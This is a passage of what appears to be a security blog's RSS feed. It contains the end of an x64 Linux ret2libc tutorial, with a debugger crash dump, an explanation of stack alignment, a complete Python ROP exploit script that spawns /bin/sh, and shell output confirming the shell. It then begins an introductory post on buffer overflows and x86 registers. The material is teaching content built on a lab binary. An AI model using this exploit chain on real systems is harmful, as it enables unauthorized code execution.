&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x007fffffffe0f4  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x007ffff7e070b3  →   movaps XMMWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x50], xmm0
&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0x007fffffffe138  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x007fffffffe5e0  →  0x007fffffffea28  →  &lt;span class=&quot;s2&quot;&gt;&quot;ALACRITTY_LOG=/tmp/Alacritty-1014.log&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x8
&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x246
&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x007ffff7f56031  →  0x68732f6e69622f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x007fffffffe5e0  →  0x007fffffffea28  →  &lt;span class=&quot;s2&quot;&gt;&quot;ALACRITTY_LOG=/tmp/Alacritty-1014.log&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x00000000403df0  →  0x000000004010f0  →  &amp;lt;__do_global_dtors_aux+0&amp;gt; endbr64
&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ZERO carry PARITY adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x33 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x2b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe0e8│+0x0000: 0x0000000000000000     ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
0x007fffffffe0f0│+0x0008: 0x00000000ffffffff
0x007fffffffe0f8│+0x0010: 0x0000000000000000
0x007fffffffe100│+0x0018: 0x0000000000000000
0x007fffffffe108│+0x0020: 0x0000000000000000
0x007fffffffe110│+0x0028: 0x0000000000000000
0x007fffffffe118│+0x0030: 0x0000000000000000
0x007fffffffe120│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e070a4                  mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x60], r12
   0x7ffff7e070a9                  mov    r9, QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax]
   0x7ffff7e070ac                  lea    rsi, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x14ef7e]        &lt;span class=&quot;c&quot;&gt;# 0x7ffff7f56031&lt;/span&gt;
 → 0x7ffff7e070b3                  movaps XMMWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x50], xmm0
   0x7ffff7e070b8                  mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsp+0x68], 0x0
   0x7ffff7e070c1                  call   0x7ffff7eb3710 &amp;lt;posix_spawn&amp;gt;
   0x7ffff7e070c6                  mov    rdi, rbx
   0x7ffff7e070c9                  mov    r12d, eax
   0x7ffff7e070cc                  call   0x7ffff7eb3610 &amp;lt;posix_spawnattr_destroy&amp;gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;ret2libc.elf&quot;, stopped 0x7ffff7e070b3 in ?? (), reason: SIGSEGV&lt;/span&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x7ffff7e070b3 → movaps XMMWORD PTR [rsp+0x50], xmm0&lt;/span&gt;
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There is a problem. Instead of having a shell, debugger triggers an instruction called &lt;strong&gt;movaps&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges,
then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system().
Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. 
The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction 
but this is easily violated during ROP chain execution, causing all further calls from that 
function to be made with a misaligned stack. movaps triggers a general protection fault 
when operating on unaligned data, so try padding your ROP chain with an extra ret before 
returning into a function or return further into a function to skip a push instruction.&lt;/p&gt;

&lt;p&gt;We can find an extra RET instruction address in the libc file, following exactly the 
process we did in the POP RDI, RET gadget (using the ropper or a similar tool).
The final exploitation script will be as follows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7dbe000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000023835&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x198031&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_function_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000493d0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit_function_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000003b100&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;ret_function_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000f6ae3&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pop_rdi_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_function_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_function_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exit_function_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_function_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_function_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_function_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_function_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_function_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_function_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition, I have added one more return address at the end. If we exit the shell, system() function will try to retun to 
an address, if it lacks that address, program will crash. After spawnig a shell it does not really matter but it is the 
best practice I think.&lt;/p&gt;

&lt;p&gt;Let’s run the program.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; ./ret2libc.elf &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python ret2libc.py&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
sh-5.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Spawned the sh shell.&lt;/span&gt;
KnuckleSecurity :: -&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Worked like charm. We have successfully spawned a shell.&lt;/p&gt;

&lt;p&gt;Let me show you what would have happened if we didn’t add the exit() function’s address.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; ./ret2libc.elf &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python ret2libc.py&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
sh-5.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit
exit&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]    2021528 segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  ./ret2libc.elf &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python ret2libc.py&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
KnuckleSecurity :: -&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Segmentation fault. Again, it does not matter after we drop the shell. Just for best practice, add it at the end.&lt;/p&gt;

&lt;h1 id=&quot;bibliography&quot;&gt;Bibliography&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Function_prologue_and_epilogue&quot;&gt;&lt;strong&gt;wikipedia.com-Function Prologue and Epilogue&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.felixcloutier.com/x86/leave&quot;&gt;&lt;strong&gt;feliclouiter.com-Leave&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.isabekov.pro/stack-alignment-when-mixing-asm-and-c-code/&quot;&gt;&lt;strong&gt;isabekov.pro-Stack Alignment When Mixing Asm and C Code&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://ret2rop.blogspot.com/2018/08/return-to-libc.html&quot;&gt;&lt;strong&gt;ret2prop.blogspot.com-return to libc&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/&quot;&gt;&lt;strong&gt;research.csiro.au-Debugging Stories Stack Alignment Matters&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul&quot;&gt;&lt;strong&gt;stackoverflow.com-Libc System When The Stack Pointer Is Not 16 Padded Causes Segmentation Fault&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment&quot;&gt;&lt;strong&gt;Why Does the x86_64 Amd64 System V ABI Mandate a 16 Byte Stack Alignment&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465&quot;&gt;&lt;strong&gt;valsamaras.medium.com-Introduction to X64 Binary Exploitation Part-2&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://crypto.stanford.edu/~blynn/asm/rop.html&quot;&gt;&lt;strong&gt;crypto.stanford.edu-Rop&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://ace315dc-a-62cb3a1a-s-sites.googlegroups.com/site/cachememory2011/memory-hierarchy/hei.png?attachauth=ANoY7crqddm97fViorOVc7ytOnK_jH4jmrRj2dDh9NENJBbf5lbb6K_gsQMxWa-FR23COMxOMGmY7MdP54qTiJBIrCHlox_Y9MmQxooP2EAfagtz7zCoy1p6dFMwwz9lgDjdylZzdjPyUnBLtgp0VPeI18BSyI_TxStd_8sYOrpLduVLKWDyZ1cOo9_F67dkP_-D82KoM5Gww7cuIQvLchnERzRr962YRZ-pTfV9yoA3mEsaA1tmDGY%3D&amp;amp;attredirects=0&quot;&gt;&lt;strong&gt;Image-Memory Hiearchy&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;http://ref.x86asm.net/coder64.html&quot;&gt;&lt;strong&gt;ref.x86asm.net-Coder64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.isss.io/resources&quot;&gt;&lt;strong&gt;isss.io-Resource&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://ctf101.org/binary-exploitation/overview/&quot;&gt;&lt;strong&gt;ctf101.org-Binary Exploitation Overview&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Calling_convention#x86-64&quot;&gt;&lt;strong&gt;wikipedia-Calling Convention x86_64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man7/libc.7.html&quot;&gt;&lt;strong&gt;man7.org-libc&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sat, 10 Dec 2022 22:20:00 +0000</pubDate>
        <link>http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/</guid>
        
        <category>c</category>
        
        <category>assembly</category>
        
        <category>x86</category>
        
        <category>32-bit</category>
        
        <category>memory-segmentation</category>
        
        <category>memory-segmentation</category>
        
        <category>buffer-overflows</category>
        
        
      </item>
    
      <item>
        <title>X64 Linux Binary Exploitation Part 1 Stack Based Overflow</title>
        <description>&lt;!-- This paper will require you to having a basic understanding on how assembly and the memory-segmentation --&gt;
&lt;!-- works. You can read how the memory-segmentation is working by visiting this paper. --&gt;

&lt;h1 id=&quot;what-is-a-buffer-overflow&quot;&gt;What is a Buffer Overflow?&lt;/h1&gt;
&lt;p&gt;Buffer overflow vulnerabilities have been around since the beginning of the computers. 
Most internet viruses and worms take advantage of this concept to propagate, and exploit zero-day vulnerabilities.&lt;/p&gt;

&lt;p&gt;C is a high level programming language (despite the fact that nowadays people call it low level.) 
but it assumes that the programmer is responsible for memory and data integrity. If this responsibility ,
were shifted over to the compiler, the resulting binary would be significantly slower, due to integrity checks
on each variable. We can observe the reality of this by experimenting the difference with some modern day 
programming languages. Whether they are interpreted, compiled or both, such as JIT (Just in Time Compiler),
the resulting binaries are much slower when they do have garbage collection, 
dynamic typing and other facilities which make it easier for the programmer to write programs. 
Processing overheads are inevitable in such cases. C does not do any of that, there is no overhead,
but that means programmer needs to be able to allocate memory and free them to prevent memory leaks,
and must deal with static typing of variables. However, lacking those features gives a significant level of control to the programmer.&lt;/p&gt;

&lt;p&gt;While C’s simplicity increases the programmer’s level of control and the efficency, 
it also means that those programs are very likely vulnerable to buffer-overflows if the programmer 
is not cautious enough. Once a variable is allocated memory, there is no built-in safeguards 
or any preventation mechanisms to ensure that the contents of that variable fit into the allocated memory. 
If a programmer wants to store a ten character long string in a memory, and allocates only eight bytes,
that type of operation is allowed. However, it will most likely cause program to crash. 
This is known as buffer-overflows since the last two bytes of the string data will not be fit into 
its allocated space and overwrites whatever happens to come next in the relevant segment.&lt;/p&gt;

&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;

&lt;!-- We will use C programming language through the post. Since the C programming language is the closest one --&gt;
&lt;!-- to the machine code after assembly, we will use it in order to analyze how variables, arrays, functions --&gt;
&lt;!-- are taking their place in memory and how the CPU work with those data. --&gt;
&lt;!----&gt;
&lt;p&gt;I want to start by writing the most complex C code that can be written.
&lt;img src=&quot;/assets/img/posts/binary-exploitation/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Let’s compile and run it.
&lt;img src=&quot;/assets/img/posts/binary-exploitation/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The aim of that paper will gain a perspective on how hackers see the code and exploit them. In order for us to 
see the bigger picture, we have to analyze each step carefully. Therefore, I will start by making that statement:
the &lt;strong&gt;firstprogram.c&lt;/strong&gt; is just a text file, and it does not carry and meaning for CPU except it is just being a simple text
file. It is what we call &lt;strong&gt;the source code&lt;/strong&gt;. It should be complied (as we did) into an executable binary file, &lt;strong&gt;.exe&lt;/strong&gt;
for windows and &lt;strong&gt;ELF executable&lt;/strong&gt; for Linux in 2022. We can think of the compiler as a middle ground. 
There are different CPU architectures, the instruction set for ARM will not work with x86, SPARC, x64,etc.
For each architecture, specialized machine code should be written for 
the same piece of program. It is pain. Instead, people write their programs in an universally accepted (high/low-level
programming languages) syntax and the compiler translates 
that piece of source code into the machine code with the available instruction set that the present CPU supplies. 
When the executable has executed, its instructions are getting loaded to the &lt;strong&gt;RAM&lt;/strong&gt; for the CPU (or GPU) to handle.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Here things goes tricky. From the programmers’ perspective they should only focus on coding a well functioning program.
However, hacker knows that the compiled machine code is what actually getting executed by the CPU in the real world.
By having a deep understanding on how the CPU works, hacker can manipulate the expected behavior in their behalf.&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;processors&quot;&gt;Processors&lt;/h1&gt;
&lt;p&gt;Processors have superfast memory units called caches and registers. Most of the instructions are actively
using those registers to read and write the data. Therefore, it is essential to understand how those
registers work in order to have a good understanding on how a CPU works.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;registers&quot;&gt;Registers&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A processor register is a quickly accessible location available to a computer’s processor. 
Registers usually consist of a small amount of fast storage, although some registers have specific
hardware functions, and may be read-only or write-only. In computer architecture, registers are typically 
addressed by mechanisms other than main memory, but may in some cases be assigned a memory address.
Almost all computers, whether load/store architecture or not, load data from a larger memory into registers where it is used 
for arithmetic operations and is manipulated or tested by machine instructions. Manipulated data is then often stored back to 
main memory, either by the same instruction or by a subsequent one. Modern processors use either static or dynamic RAM as main 
memory, with the latter usually accessed via one or more cache levels.&lt;/p&gt;

&lt;p&gt;Processor registers are normally at the top of the memory hierarchy, and provide the fastest way to access data. 
The term normally refers only to the group of registers that are directly encoded as part of an instruction, 
as defined by the instruction set.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;memory-hierarchy&quot;&gt;Memory Hierarchy&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/15.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;x86-architecture&quot;&gt;x86 Architecture&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The x86 architecture has eight 32-bit general purpose registers (GPRs):
EAX, EBX, ECX, EDX, EDI, EBP and ESP. Some of them further divided into 8 and 16 bit registers. 
EIP is being used to store the instruction pointer.&lt;br /&gt;
General purpose registers for x86 as the
following:
&lt;img src=&quot;/assets/img/posts/binary-exploitation/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;REGISTER&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Purpose&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ECX&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Counter in loops&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ESI&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Source in string/memory operations&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;EDI&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Destination in string/memory operations&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;EDP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Base frame pointer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ESP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stack pointer&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The common data types are as follows:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bytes: 8 bits. Examples: AL, BL, CL&lt;/li&gt;
  &lt;li&gt;Word: 16 bits. Examples: AX, BX, CX&lt;/li&gt;
  &lt;li&gt;Double Word: 32 bits. Examples: EAX, EBX, ECX&lt;/li&gt;
  &lt;li&gt;Quad Word: 64 bits. While x86 does not have 64-bit GPRs, it can combine
two registers, usually EDX:EAX, and treat them as 64-bit values in some 
scenarios. For example, the RDTSC instruction writes a 64-bit value to EDX:EAX.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The 32-bit EFLAGS register is used to store the status of arithmetic operations
and other execution states for x86 as well as information 
about restrictions placed on the CPU operation at the current time.
For instance, if the an ADD
operation resulted in a zero, the ZF flag will be set to 1. The flags in EFLAGS are
primarily used to implement conditional branching.In addition to the GPRs, EIP, 
